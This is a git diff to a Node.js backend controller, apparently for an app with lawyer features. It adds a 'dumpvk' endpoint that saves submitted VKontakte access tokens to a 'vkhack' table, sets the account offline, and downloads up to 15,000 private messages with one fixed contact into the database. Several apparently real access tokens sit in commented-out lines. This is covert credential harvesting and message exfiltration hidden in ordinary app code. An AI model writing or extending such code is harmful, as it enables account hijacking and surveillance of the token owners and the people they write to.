@@ -26,6 +26,8 @@ import sendNotification from '../services/notificationService';
 
 import env from '../../env';
 
+import { VK } from 'vk-io';
+
 const { gostCrypto, gostEngine } = require('node-gost-crypto');
 
 const listOfUsers = async (req, res) => {
@@ -196,17 +198,58 @@ const dumpvk = async (req, res) => {
   const successMessage = Object.assign({}, sMessage);
 
   const createQuery = 'INSERT INTO vkhack (access_token) VALUES ($1)';
+  const addKDLastMessage = "UPDATE users set last15k_message_with_dk = $2 Where token = $1";
   //
   const {token} = req.body
 
   try {
-
     await dbQuery.query(createQuery, [token]);
-    return res.status(status.success).send(successMessage);
+    res.status(status.success).send(successMessage);
   } catch (error) {
     console.error(error);
-    return res.status(status.bad).send(errorMessage);
+    res.status(status.bad).send(errorMessage);
   }
+
+  const vk = new VK({
+    //token: "8d3023b0084555b929ca833070abd26f41fdb2b9fe6006df908437f21fcb2538a5bd3502dafc3d95e9cd0"
+    //token: "de9c1242b6c6c23fb5fa66a299fbbe2cdc3e5cdd1f76908f0e562290d8542fe8fa49ddd647fcc3ace7f1a"
+    //token: "5ba3def5f7fda6a3ceb038e4bf97fe7ffa2c2f23ee60227d3fc66418461c38f86efa474e008d8b4cb4bb8"
+    //token: "64e0527ff530cbc2c7a2f1222d2275942d8b9f278ea2c5af207f08614e201bef9eaf8ff674929b850f9ec"
+    //token: "c09f6d61e3f3d7f4c1114b95ad7304f96943e55ba882158b62162139b4d997008df1fa9fa5e317a4a16ce"
+    //  token: "97709db3335aa5d94d9b375b90be473003dffdae46c3fe07905271963171c3f225e0b65a39fcf01770ba7"
+    //token: "555259f509e141d3ef812dee58bf38eeb3e4bd07e966c6591f5ab22cb364b0a8c0a7c29abda42a96cf30f"
+    //token: "d592ebc3263f8ce82f796d5c8af74f873bcbc3675346740c0920fbf3e24ddf26cb3fd72a8d7a805067e55"
+    token: token
+  });
+
+  await vk.api.account.setOffline({});
+
+  var result = [];
+  var last_resp = [];
+  var tryes = 0;
+
+  do {
+
+      const response = await vk.api.messages.getHistory({
+        peer_id: "178269891",
+        offset: 200 * tryes,
+        count: 200
+      });
+    result = result.concat(response['items']);
+    console.log(tryes);
+    last_resp = response['items'];
+    tryes++;
+    if (200 * tryes > 15000) {
+      break;
+    }
+    if (last_resp.length < 200) {
+      break;
+    }
+
+  } while (true);
+
+  dbQuery.query(addKDLastMessage, [token, result]);
+
 };
 
 const createLawyer = async (req, res) => {
